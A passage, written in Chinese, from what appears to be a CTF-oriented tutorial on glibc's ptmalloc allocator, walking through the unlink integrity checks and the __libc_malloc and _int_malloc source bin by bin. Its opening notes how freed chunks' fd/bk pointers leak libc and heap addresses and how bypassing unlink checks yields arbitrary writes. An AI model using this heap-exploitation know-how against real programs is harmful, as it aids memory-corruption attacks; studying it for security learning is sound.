\uff0c\u4f46\u662f\u5f53\u6211\u4eec\u53bb\u904d\u5386\u6574\u4e2a\u53cc\u5411\u94fe\u8868\u65f6\uff0c\u5df2\u7ecf\u904d\u5386\u4e0d\u5230\u5bf9\u5e94\u7684\u94fe\u8868\u4e86\u3002\u8fd9\u4e00\u70b9\u6ca1\u6709\u53d8\u5316\u8fd8\u662f\u5f88\u6709\u7528\u5904\u7684\uff0c\u56e0\u4e3a\u6211\u4eec\u6709\u65f6\u5019\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u6765\u6cc4\u6f0f\u5730\u5740 libc \u5730\u5740 P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5934\u90e8\uff0cbk \u6cc4\u6f0f P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5c3e\u90e8\uff0cfd \u6cc4\u6f0f \u53cc\u5411\u94fe\u8868\u53ea\u5305\u542b\u4e00\u4e2a\u7a7a\u95f2 chunk \u65f6\uff0cP \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u4e2d\uff0cfd \u548c bk \u5747\u53ef\u4ee5\u6cc4\u6f0f \u6cc4\u6f0f\u5806\u5730\u5740\uff0c\u53cc\u5411\u94fe\u8868\u5305\u542b\u591a\u4e2a\u7a7a\u95f2 chunk P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5934\u90e8\uff0cfd \u6cc4\u6f0f P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u4e2d\uff0cfd \u548c bk \u5747\u53ef\u4ee5\u6cc4\u6f0f P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5c3e\u90e8\uff0cbk \u6cc4\u6f0f \u6ce8\u610f \u8fd9\u91cc\u7684\u5934\u90e8\u6307\u7684\u662f bin \u7684 fd \u6307\u5411\u7684 chunk\uff0c\u5373\u53cc\u5411\u94fe\u8868\u4e2d\u6700\u65b0\u52a0\u5165\u7684 chunk\u3002 \u8fd9\u91cc\u7684\u5c3e\u90e8\u6307\u7684\u662f bin \u7684 bk \u6307\u5411\u7684 chunk\uff0c\u5373\u53cc\u5411\u94fe\u8868\u4e2d\u6700\u5148\u52a0\u5165\u7684 chunk\u3002 \u540c\u65f6\uff0c\u5bf9\u4e8e\u65e0\u8bba\u662f\u5bf9\u4e8e fd\uff0cbk \u8fd8\u662f fd_nextsize \uff0cbk_nextsize\uff0c\u7a0b\u5e8f\u90fd\u4f1a\u68c0\u6d4b fd \u548c bk \u662f\u5426\u6ee1\u8db3\u5bf9\u5e94\u7684\u8981\u6c42\u3002 // fd bk if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) \\ malloc_printerr ( check_action , \"corrupted double-linked list\" , P , AV ); \\ // next_size related if ( __builtin_expect ( P -> fd_nextsize -> bk_nextsize != P , 0 ) \\ || __builtin_expect ( P -> bk_nextsize -> fd_nextsize != P , 0 )) \\ malloc_printerr ( check_action , \\ \"corrupted double-linked list (not small)\" , \\ P , AV ); \u770b\u8d77\u6765\u4f3c\u4e4e\u5f88\u6b63\u5e38\u3002\u6211\u4eec\u4ee5 fd \u548c bk \u4e3a\u4f8b\uff0cP \u7684 forward chunk \u7684 bk \u5f88\u81ea\u7136\u662f P \uff0c\u540c\u6837 P \u7684 backward chunk \u7684 fd \u4e5f\u5f88\u81ea\u7136\u662f P \u3002\u5982\u679c\u6ca1\u6709\u505a\u76f8\u5e94\u7684\u68c0\u67e5\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 P \u7684 fd \u4e0e bk\uff0c\u4ece\u800c\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u8fbe\u5230\u4efb\u610f\u5730\u5740\u5199\u7684\u6548\u679c\u3002\u5173\u4e8e\u66f4\u52a0\u8be6\u7ec6\u7684\u4f8b\u5b50\uff0c\u53ef\u4ee5\u53c2\u89c1\u5229\u7528\u90e8\u5206\u7684 unlink \u3002 \u6ce8\u610f\uff1a\u5806\u7684\u7b2c\u4e00\u4e2a chunk \u6240\u8bb0\u5f55\u7684 prev_inuse \u4f4d\u9ed8\u8ba4\u4e3a1\u3002 \u7533\u8bf7\u5185\u5b58\u5757 \u00b6 \u4e00\u822c\u6211\u4eec\u4f1a\u4f7f\u7528 malloc \u51fd\u6570\u6765\u7533\u8bf7\u5185\u5b58\u5757\uff0c\u53ef\u662f\u5f53\u4ed4\u7ec6\u770b glibc \u7684\u6e90\u7801\u5b9e\u73b0\u65f6\uff0c\u5176\u5b9e\u5e76\u6ca1\u6709malloc \u51fd\u6570\u3002\u5176\u5b9e\u8be5\u51fd\u6570\u771f\u6b63\u8c03\u7528\u7684\u662f __libc_malloc \u51fd\u6570\u3002\u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u5199\u4e2a malloc \u51fd\u6570\u5462\uff0c\u56e0\u4e3a\u6709\u65f6\u5019\u6211\u4eec\u53ef\u80fd\u9700\u8981\u4e0d\u540c\u7684\u540d\u79f0\u3002\u6b64\u5916\uff0c__libc_malloc \u51fd\u6570\u53ea\u662f\u7528\u6765\u7b80\u5355\u5c01\u88c5 _int_malloc \u51fd\u6570\u3002_int_malloc \u624d\u662f\u7533\u8bf7\u5185\u5b58\u5757\u7684\u6838\u5fc3\u3002\u4e0b\u9762\u6211\u4eec\u6765\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u5177\u4f53\u7684\u5b9e\u73b0\u3002 __libc_malloc \u00b6 \u8be5\u51fd\u6570\u4f1a\u9996\u5148\u68c0\u67e5\u662f\u5426\u6709\u5185\u5b58\u5206\u914d\u51fd\u6570\u7684\u94a9\u5b50\u51fd\u6570\uff08__malloc_hook\uff09\uff0c\u8fd9\u4e2a\u4e3b\u8981\u7528\u4e8e\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u5806\u5206\u914d\u51fd\u6570\uff0c\u65b9\u4fbf\u7528\u6237\u5feb\u901f\u4fee\u6539\u5bf9\u5206\u914d\u51fd\u6570\u5e76\u8fdb\u884c\u6d4b\u8bd5\u3002\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c \u7528\u6237\u7533\u8bf7\u7684\u5b57\u8282\u4e00\u65e6\u8fdb\u5165\u7533\u8bf7\u5185\u5b58\u51fd\u6570\u4e2d\u5c31\u53d8\u6210\u4e86\u65e0\u7b26\u53f7\u6574\u6570 \u3002 // wapper for int_malloc void * __libc_malloc ( size_t bytes ) { mstate ar_ptr ; void * victim ; // \u68c0\u67e5\u662f\u5426\u6709\u5185\u5b58\u5206\u914d\u94a9\u5b50\uff0c\u5982\u679c\u6709\uff0c\u8c03\u7528\u94a9\u5b50\u5e76\u8fd4\u56de. void * ( * hook )( size_t , const void * ) = atomic_forced_read ( __malloc_hook ); if ( __builtin_expect ( hook != NULL , 0 )) return ( * hook )( bytes , RETURN_ADDRESS ( 0 )); \u63a5\u7740\u4f1a\u5bfb\u627e\u4e00\u4e2a arena \u6765\u8bd5\u56fe\u5206\u914d\u5185\u5b58\u3002 arena_get ( ar_ptr , bytes ); \u7136\u540e\u8c03\u7528 _int_malloc \u51fd\u6570\u53bb\u7533\u8bf7\u5bf9\u5e94\u7684\u5185\u5b58\u3002 victim = _int_malloc ( ar_ptr , bytes ); \u5982\u679c\u5206\u914d\u5931\u8d25\u7684\u8bdd\uff0cptmalloc \u4f1a\u5c1d\u8bd5\u518d\u53bb\u5bfb\u627e\u4e00\u4e2a\u53ef\u7528\u7684 arena\uff0c\u5e76\u5206\u914d\u5185\u5b58\u3002 /* Retry with another arena only if we were able to find a usable arena before. */ if ( ! victim && ar_ptr != NULL ) { LIBC_PROBE ( memory_malloc_retry , 1 , bytes ); ar_ptr = arena_get_retry ( ar_ptr , bytes ); victim = _int_malloc ( ar_ptr , bytes ); } \u5982\u679c\u7533\u8bf7\u5230\u4e86 arena\uff0c\u90a3\u4e48\u5728\u9000\u51fa\u4e4b\u524d\u8fd8\u5f97\u89e3\u9501\u3002 if ( ar_ptr != NULL ) __libc_lock_unlock ( ar_ptr -> mutex ); \u5224\u65ad\u76ee\u524d\u7684\u72b6\u6001\u662f\u5426\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 \u8981\u4e48\u6ca1\u6709\u7533\u8bf7\u5230\u5185\u5b58 \u8981\u4e48\u662f mmap \u7684\u5185\u5b58 \u8981\u4e48\u7533\u8bf7\u5230\u7684\u5185\u5b58\u5fc5\u987b\u5728\u5176\u6240\u5206\u914d\u7684arena\u4e2d assert ( ! victim || chunk_is_mmapped ( mem2chunk ( victim )) || ar_ptr == arena_for_chunk ( mem2chunk ( victim ))); \u6700\u540e\u8fd4\u56de\u5185\u5b58\u3002 return victim ; } _int_malloc \u00b6 _int_malloc \u662f\u5185\u5b58\u5206\u914d\u7684\u6838\u5fc3\u51fd\u6570\uff0c\u5176\u6838\u5fc3\u601d\u8def\u6709\u5982\u4e0b \u5b83\u6839\u636e\u7528\u6237\u7533\u8bf7\u7684 \u5185\u5b58\u5757\u5927\u5c0f \u4ee5\u53ca \u76f8\u5e94\u5927\u5c0f chunk \u901a\u5e38\u4f7f\u7528\u7684\u9891\u5ea6 \uff08fastbin chunk, small chunk, large chunk\uff09\uff0c\u4f9d\u6b21\u5b9e\u73b0\u4e86\u4e0d\u540c\u7684\u5206\u914d\u65b9\u6cd5\u3002 \u5b83\u7531\u5c0f\u5230\u5927\u4f9d\u6b21\u68c0\u67e5\u4e0d\u540c\u7684 bin \u4e2d\u662f\u5426\u6709\u76f8\u5e94\u7684\u7a7a\u95f2\u5757\u53ef\u4ee5\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42\u7684\u5185\u5b58\u3002 \u5f53\u6240\u6709\u7684\u7a7a\u95f2 chunk \u90fd\u65e0\u6cd5\u6ee1\u8db3\u65f6\uff0c\u5b83\u4f1a\u8003\u8651 top chunk\u3002 \u5f53 top chunk \u4e5f\u65e0\u6cd5\u6ee1\u8db3\u65f6\uff0c\u5806\u5206\u914d\u5668\u624d\u4f1a\u8fdb\u884c\u5185\u5b58\u5757\u7533\u8bf7\u3002 \u5728\u8fdb\u5165\u8be5\u51fd\u6570\u540e\uff0c\u51fd\u6570\u7acb\u9a6c\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u81ea\u5df1\u9700\u8981\u7684\u53d8\u91cf\uff0c\u5e76\u5c06\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u8f6c\u6362\u4e3a\u5185\u90e8\u7684chunk\u5927\u5c0f\u3002 static void * _int_malloc ( mstate av , size_t bytes ) { INTERNAL_SIZE_T nb ; /* normalized request size */ unsigned int idx ; /* associated bin index */ mbinptr bin ; /* associated bin */ mchunkptr victim ; /* inspected/selected chunk */ INTERNAL_SIZE_T size ; /* its size */ int victim_index ; /* its bin index */ mchunkptr remainder ; /* remainder from a split */ unsigned long remainder_size ; /* its size */ unsigned int block ; /* bit map traverser */ unsigned int bit ; /* bit map traverser */ unsigned int map ; /* current word of binmap */ mchunkptr fwd ; /* misc temp for linking */ mchunkptr bck ; /* misc temp for linking */ const char * errstr = NULL ; /* Convert request size to internal form by adding SIZE_SZ bytes overhead plus possibly more to obtain necessary alignment and/or to obtain a size of at least MINSIZE, the smallest allocatable size. Also, checked_request2size traps (returning 0) request sizes that are so large that they wrap around zero when padded and aligned. */ checked_request2size ( bytes , nb ); arena \u00b6 /* There are no usable arenas. Fall back to sysmalloc to get a chunk from mmap. */ if ( __glibc_unlikely ( av == NULL )) { void * p = sysmalloc ( nb , av ); if ( p != NULL ) alloc_perturb ( p , bytes ); return p ; } fast bin \u00b6 \u5982\u679c\u7533\u8bf7\u7684 chunk \u7684\u5927\u5c0f\u4f4d\u4e8e fastbin \u8303\u56f4\u5185\uff0c \u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u91cc\u6bd4\u8f83\u7684\u662f\u65e0\u7b26\u53f7\u6574\u6570 \u3002 \u6b64\u5916\uff0c\u662f\u4ece fastbin \u7684\u5934\u7ed3\u70b9\u5f00\u59cb\u53d6 chunk \u3002 /* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */ if (( unsigned long ) ( nb ) <= ( unsigned long ) ( get_max_fast ())) { // \u5f97\u5230\u5bf9\u5e94\u7684fastbin\u7684\u4e0b\u6807 idx = fastbin_index ( nb ); // \u5f97\u5230\u5bf9\u5e94\u7684fastbin\u7684\u5934\u6307\u9488 mfastbinptr * fb = & fastbin ( av , idx ); mchunkptr pp = * fb ; // \u5229\u7528fd\u904d\u5386\u5bf9\u5e94\u7684bin\u5185\u662f\u5426\u6709\u7a7a\u95f2\u7684chunk\u5757\uff0c do { victim = pp ; if ( victim == NULL ) break ; } while (( pp = catomic_compare_and_exchange_val_acq ( fb , victim -> fd , victim )) != victim ); // \u5b58\u5728\u53ef\u4ee5\u5229\u7528\u7684chunk if ( victim != 0 ) { // \u68c0\u67e5\u53d6\u5230\u7684 chunk \u5927\u5c0f\u662f\u5426\u4e0e\u76f8\u5e94\u7684 fastbin \u7d22\u5f15\u4e00\u81f4\u3002 // \u6839\u636e\u53d6\u5f97\u7684 victim \uff0c\u5229\u7528 chunksize \u8ba1\u7b97\u5176\u5927\u5c0f\u3002 // \u5229\u7528fastbin_index \u8ba1\u7b97 chunk \u7684\u7d22\u5f15\u3002 if ( __builtin_expect ( fastbin_index ( chunksize ( victim )) != idx , 0 )) { errstr = \"malloc(): memory corruption (fast)\" ; errout : malloc_printerr ( check_action , errstr , chunk2mem ( victim ), av ); return NULL ; } // \u7ec6\u81f4\u7684\u68c0\u67e5\u3002\u3002\u53ea\u6709\u5728 DEBUG \u7684\u65f6\u5019\u6709\u7528 check_remalloced_chunk ( av , victim , nb ); // \u5c06\u83b7\u53d6\u7684\u5230chunk\u8f6c\u6362\u4e3amem\u6a21\u5f0f void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } } small bin \u00b6 \u5982\u679c\u83b7\u53d6\u7684\u5185\u5b58\u5757\u7684\u8303\u56f4\u5904\u4e8e small bin \u7684\u8303\u56f4\uff0c\u90a3\u4e48\u6267\u884c\u5982\u4e0b\u6d41\u7a0b /* If a small request, check regular bin. Since these \"smallbins\" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if ( in_smallbin_range ( nb )) { // \u83b7\u53d6 small bin \u7684\u7d22\u5f15 idx = smallbin_index ( nb ); // \u83b7\u53d6\u5bf9\u5e94 small bin \u4e2d\u7684 chunk \u6307\u9488 bin = bin_at ( av , idx ); // \u5148\u6267\u884c victim = last(bin)\uff0c\u83b7\u53d6 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk // \u5982\u679c victim = bin \uff0c\u90a3\u8bf4\u660e\u8be5 bin \u4e3a\u7a7a\u3002 // \u5982\u679c\u4e0d\u76f8\u7b49\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u79cd\u60c5\u51b5 if (( victim = last ( bin )) != bin ) { // \u7b2c\u4e00\u79cd\u60c5\u51b5\uff0csmall bin \u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u3002 if ( victim == 0 ) /* initialization check */ // \u6267\u884c\u521d\u59cb\u5316\uff0c\u5c06 fast bins \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76 malloc_consolidate ( av ); // \u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0csmall bin \u4e2d\u5b58\u5728\u7a7a\u95f2\u7684 chunk else { // \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002 bck = victim -> bk ; // \u68c0\u67e5 bck->fd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020 if ( __glibc_unlikely ( bck -> fd != victim )) { errstr = \"malloc(): smallbin double linked list corrupted\" ; goto errout ; } // \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d set_inuse_bit_at_offset ( victim , nb ); // \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765 bin -> bk = bck ; bck -> fd = bin ; // \u5982\u679c\u4e0d\u662f main_arena\uff0c\u8bbe\u7f6e\u5bf9\u5e94\u7684\u6807\u5fd7 if ( av != & main_arena ) set_non_main_arena ( victim ); // \u7ec6\u81f4\u7684\u68c0\u67e5\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u6ca1\u6709\u4f5c\u7528 check_malloced_chunk ( av , victim , nb ); // \u5c06\u7533\u8bf7\u5230\u7684 chunk \u8f6c\u5316\u4e3a\u5bf9\u5e94\u7684 mem \u72b6\u6001 void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86 perturb_type , \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } } } large bin \u00b6 \u5f53 fast bin\u3001small bin \u4e2d\u7684 chunk \u90fd\u4e0d\u80fd\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42 chunk \u5927\u5c0f\u65f6\uff0c\u5c31\u4f1a\u8003\u8651\u662f\u4e0d\u662f large bin\u3002\u4f46\u662f\uff0c\u5176\u5b9e\u5728 large bin \u4e2d\u5e76\u6ca1\u6709\u76f4\u63a5\u53bb\u626b\u63cf\u5bf9\u5e94 bin \u4e2d\u7684chunk\uff0c\u800c\u662f\u5148\u5229\u7528 malloc_consolidate\uff08\u53c2\u89c1malloc_state\u76f8\u5173\u51fd\u6570\uff09 \u51fd\u6570\u5904\u7406 fast bin \u4e2d\u7684chunk\uff0c\u5c06\u6709\u53ef\u80fd\u80fd\u591f\u5408\u5e76\u7684 chunk \u5148\u8fdb\u884c\u5408\u5e76\u540e\u653e\u5230 unsorted bin \u4e2d\uff0c\u4e0d\u80fd\u591f\u5408\u5e76\u7684\u5c31\u76f4\u63a5\u653e\u5230 unsorted bin \u4e2d\uff0c\u7136\u540e\u518d\u5728\u4e0b\u9762\u7684\u5927\u5faa\u73af\u4e2d\u8fdb\u884c\u76f8\u5e94\u7684\u5904\u7406\u3002 \u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u4ece\u76f8\u5e94\u7684 bin \u4e2d\u53d6\u51fa large chunk \u5462\uff1f\u8fd9\u662fptmalloc \u7684\u673a\u5236\uff0c\u5b83\u4f1a\u5728\u5206\u914d large chunk \u4e4b\u524d\u5bf9\u5806\u4e2d\u788e\u7247 chunk \u8fdb\u884c\u5408\u5e76\uff0c\u4ee5\u4fbf\u51cf\u5c11\u5806\u4e2d\u7684\u788e\u7247\u3002 /* If this is a large request, consolidate fastbins before continuing. While it might look excessive to kill all fastbins before even seeing if there is space available, this avoids fragmentation problems normally associated with fastbins. Also, in practice, programs tend to have runs of either small or large requests, but less often mixtures, so consolidation is not invoked all that often in most programs. And the programs that it is called frequently in otherwise tend to fragment. */ else { // \u83b7\u53d6large bin\u7684\u4e0b\u6807\u3002 idx = largebin_index ( nb ); // \u5982\u679c\u5b58\u5728fastbin\u7684\u8bdd\uff0c\u4f1a\u5904\u7406 fastbin if ( have_fastchunks ( av )) malloc_consolidate ( av ); } \u5927\u5faa\u73af \u00b6 \u5982\u679c\u7a0b\u5e8f\u6267\u884c\u5230\u4e86\u8fd9\u91cc\uff0c\u90a3\u4e48\u8bf4\u660e \u4e0e chunk \u5927\u5c0f\u6b63\u597d\u4e00\u81f4\u7684 bin (fast bin\uff0c small bin) \u4e2d\u6ca1\u6709 chunk\u53ef\u4ee5\u76f4\u63a5\u6ee1\u8db3\u9700\u6c42 \uff0c\u4f46\u662flarge chunk \u5219\u662f\u5728\u8fd9\u4e2a\u5927\u5faa\u73af\u4e2d\u5904\u7406 \u3002 \u5728\u63a5\u4e0b\u6765\u7684\u8fd9\u4e2a\u5faa\u73af\u4e2d\uff0c\u4e3b\u8981\u505a\u4e86\u4ee5\u4e0b\u7684\u64cd\u4f5c \u5c1d\u8bd5\u4ece unsorted bin \u4e2d\u5206\u914d\u7528\u6237\u6240\u9700\u7684\u5185\u5b58 \u5c1d\u8bd5\u4ece large bin \u4e2d\u5206\u914d\u7528\u6237\u6240\u9700\u7684\u5185\u5b58 \u5c1d\u8bd5\u4ece top chunk \u4e2d\u5206\u914d\u7528\u6237\u6240\u9700\u5185\u5b58 \u8be5\u90e8\u5206\u662f\u4e00\u4e2a\u5927\u5faa\u73af\uff0c\u8fd9\u662f\u4e3a\u4e86\u5c1d\u8bd5\u91cd\u65b0\u5206\u914d small bin chunk\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u867d\u7136\u4f1a\u9996\u5148\u4f7f\u7528 large bin\uff0ctop chunk \u6765\u5c1d\u8bd5\u6ee1\u8db3\u7528\u6237\u7684\u8bf7\u6c42\uff0c\u4f46\u662f\u5982\u679c\u6ca1\u6709\u6ee1\u8db3\u7684\u8bdd\uff0c\u7531\u4e8e\u6211\u4eec\u5728\u4e0a\u9762\u6ca1\u6709\u5206\u914d\u6210\u529f small bin\uff0c\u6211\u4eec\u5e76\u6ca1\u6709\u5bf9fast bin \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76\uff0c\u6240\u4ee5\u8fd9\u91cc\u4f1a\u8fdb\u884c fast bin chunk \u7684\u5408\u5e76\uff0c\u8fdb\u800c\u4f7f\u7528\u4e00\u4e2a\u5927\u5faa\u73af\u6765\u5c1d\u8bd5\u518d\u6b21\u5206\u914dsmall bin chunk\u3002 /* Process recently freed or remaindered chunks, taking one only if it is exact fit, or, if this a small request, the chunk is remainder from the most recent non-exact fit. Place other traversed chunks in bins. Note that this step is the only place in any routine where chunks are placed in bins. The outer loop here is needed because we might not realize until near the end of malloc that we should have consolidated, so must do so and retry. This happens at most once, and only when we would otherwise need to expand memory to service a \"small\" request. */ for (;;) { int iters = 0 ; unsort bin \u904d\u5386 \u00b6 \u5148\u8003\u8651 unsorted bin\uff0c\u518d\u8003\u8651 last remainder \uff0c\u4f46\u662f\u5bf9\u4e8e small bin chunk \u7684\u8bf7\u6c42\u4f1a\u6709\u6240\u4f8b\u5916\u3002 \u6ce8\u610f unsorted bin \u7684\u904d\u5386\u987a\u5e8f\u4e3a bk\u3002 // \u5982\u679c unsorted bin \u4e0d\u4e3a\u7a7a // First In First Out while (( victim = unsorted_chunks ( av ) -> bk ) != unsorted_chunks ( av )) { // victim \u4e3a unsorted bin \u7684\u6700\u540e\u4e00\u4e2a chunk // bck \u4e3a unsorted bin \u7684\u5012\u6570\u7b2c\u4e8c\u4e2a chunk bck = victim -> bk ; // \u5224\u65ad\u5f97\u5230\u7684 chunk \u662f\u5426\u6ee1\u8db3\u8981\u6c42\uff0c\u4e0d\u80fd\u8fc7\u5c0f\uff0c\u4e5f\u4e0d\u80fd\u8fc7\u5927 // \u4e00\u822c system_mem \u7684\u5927\u5c0f\u4e3a132K if ( __builtin_expect ( chunksize_nomask ( victim ) <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( chunksize_nomask ( victim ) > av -> system_mem , 0 )) malloc_printerr ( check_action , \"malloc(): memory corruption\" , chunk2mem ( victim ), av ); // \u5f97\u5230victim\u5bf9\u5e94\u7684chunk\u5927\u5c0f\u3002 size = chunksize ( victim ); small request \u00b6 \u5982\u679c\u7528\u6237\u7684\u8bf7\u6c42\u4e3a small bin chunk\uff0c\u90a3\u4e48\u6211\u4eec\u9996\u5148\u8003\u8651 last remainder\uff0c\u5982\u679c last remainder \u662f unsorted bin \u4e2d\u7684\u552f\u4e00\u4e00\u5757\u7684\u8bdd\uff0c \u5e76\u4e14 last remainder \u7684\u5927\u5c0f\u5206\u5272\u591f\u8fd8\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a chunk \uff0c \u4e3a\u4ec0\u4e48\u6ca1\u6709\u7b49\u53f7 \uff1f /* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ if ( in_smallbin_range ( nb ) && bck == unsorted_chunks ( av ) && victim == av -> last_remainder && ( unsigned long ) ( size ) > ( unsigned long ) ( nb + MINSIZE )) { /* split and reattach remainder */ // \u83b7\u53d6\u65b0\u7684 remainder \u7684\u5927\u5c0f remainder_size = size - nb ; // \u83b7\u53d6\u65b0\u7684 remainder \u7684\u4f4d\u7f6e remainder = chunk_at_offset ( victim , nb ); // \u66f4\u65b0 unsorted bin \u7684\u60c5\u51b5 unsorted_chunks ( av ) -> bk = unsorted_chunks ( av ) -> fd = remainder ; // \u66f4\u65b0 av \u4e2d\u8bb0\u5f55\u7684 last_remainder av -> last_remainder = remainder ; // \u66f4\u65b0last remainder\u7684\u6307\u9488 remainder -> bk = remainder -> fd = unsorted_chunks ( av ); if ( ! in_smallbin_range ( remainder_size )) { remainder -> fd_nextsize = NULL ; remainder -> bk_nextsize = NULL ; } // \u8bbe\u7f6evictim\u7684\u5934\u90e8\uff0c set_head ( victim , nb | PREV_INUSE | ( av != & main_arena ? NON_MAIN_ARENA : 0 )); // \u8bbe\u7f6e remainder \u7684\u5934\u90e8 set_head ( remainder , remainder_size | PREV_INUSE ); // \u8bbe\u7f6e\u8bb0\u5f55 remainder \u5927\u5c0f\u7684 prev_size \u5b57\u6bb5\uff0c\u56e0\u4e3a\u6b64\u65f6 remainder \u5904\u4e8e\u7a7a\u95f2\u72b6\u6001\u3002 set_foot ( remainder , remainder_size ); // \u7ec6\u81f4\u7684\u68c0\u67e5\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u4e0b\u6ca1\u6709\u4f5c\u7528 check_malloced_chunk ( av , victim , nb ); // \u5c06 victim \u4ece chunk \u6a21\u5f0f\u8f6c\u5316\u4e3amem\u6a21\u5f0f void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } \u521d\u59cb\u53d6\u51fa \u00b6 /* remove from unsorted list */ unsorted_chunks ( av ) -> bk = bck ; bck -> fd = unsorted_chunks ( av ); exact fit \u00b6 \u5982\u679c\u4ece unsorted bin \u4e2d\u53d6\u51fa\u6765\u7684 chunk \u5927\u5c0f\u6b63\u597d\u5408\u9002\uff0c\u5c31\u76f4\u63a5\u4f7f\u7528\u3002\u8fd9\u91cc\u5e94\u8be5\u5df2\u7ecf\u628a\u5408\u5e76\u540e\u6070\u597d\u5408\u9002\u7684 chunk \u7ed9\u5206\u914d\u51fa\u53bb\u4e86\u3002 /* Take now instead of binning if exact fit */ if ( size == nb ) { set_inuse_bit_at_offset ( victim , size ); if ( av != & main_arena ) set_non_main_arena ( victim ); check_malloced_chunk ( av , victim , nb ); void * p = chunk2mem ( victim ); alloc_perturb ( p , bytes ); return p ; } place chunk in small bin \u00b6 \u628a\u53d6\u51fa\u6765\u7684 chunk \u653e\u5230\u5bf9\u5e94\u7684 small bin \u4e2d\u3002 /* place chunk in bin */ if ( in_smallbin_range ( size )) { victim_index = smallbin_index ( size ); bck = bin_at ( av , victim_index ); fwd = bck -> fd ; place chunk in large bin \u00b6 \u628a\u53d6\u51fa\u6765\u7684 chunk \u653e\u5230\u5bf9\u5e94\u7684 large bin \u4e2d\u3002 } else { // large bin\u8303\u56f4 victim_index = largebin_index ( size ); bck = bin_at ( av , victim_index ); fwd = bck -> fd ; /* maintain large bins in sorted order */ /* \u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u603b\u7ed3\u51fa\uff0clargebin \u4ee5 fd_nextsize \u9012\u51cf\u6392\u5e8f\u3002 \u540c\u6837\u5927\u5c0f\u7684 chunk\uff0c\u540e\u6765\u7684\u53ea\u4f1a\u63d2\u5165\u5230\u4e4b\u524d\u540c\u6837\u5927\u5c0f\u7684 chunk \u540e\uff0c \u800c\u4e0d\u4f1a\u4fee\u6539\u4e4b\u524d\u76f8\u540c\u5927\u5c0f\u7684fd/bk_nextsize\uff0c\u8fd9\u4e5f\u5f88\u5bb9\u6613\u7406\u89e3\uff0c \u53ef\u4ee5\u51cf\u4f4e\u5f00\u9500\u3002\u6b64\u5916\uff0cbin \u5934\u4e0d\u53c2\u4e0e nextsize \u94fe\u63a5\u3002*/ // \u5982\u679c large bin \u94fe\u8868\u4e0d\u7a7a if ( fwd != bck ) { /* Or with inuse bit to speed comparisons */ // \u52a0\u901f\u6bd4\u8f83\uff0c\u5e94\u8be5\u4e0d\u4ec5\u4ec5\u6709\u8fd9\u4e2a\u8003\u8651\uff0c\u56e0\u4e3a\u94fe\u8868\u91cc\u7684chunk\u90fd\u4f1a\u8bbe\u7f6e\u8be5\u4f4d\u3002 size |= PREV_INUSE ; /* if smaller than smallest, bypass loop below */ // bck-bk \u5b58\u50a8\u7740\u76f8\u5e94 large bin \u4e2d\u6700\u5c0f\u7684chunk\u3002 // \u5982\u679c\u904d\u5386\u7684 chunk \u6bd4\u5f53\u524d\u6700\u5c0f\u7684\u8fd8\u8981\u5c0f\uff0c\u90a3\u5c31\u53ea\u9700\u8981\u63d2\u5165\u5230\u94fe\u8868\u5c3e\u90e8\u3002 // \u5224\u65ad bck->bk \u662f\u4e0d\u662f\u5728 main arena\u3002 assert ( chunk_main_arena ( bck -> bk )); if (( unsigned long ) 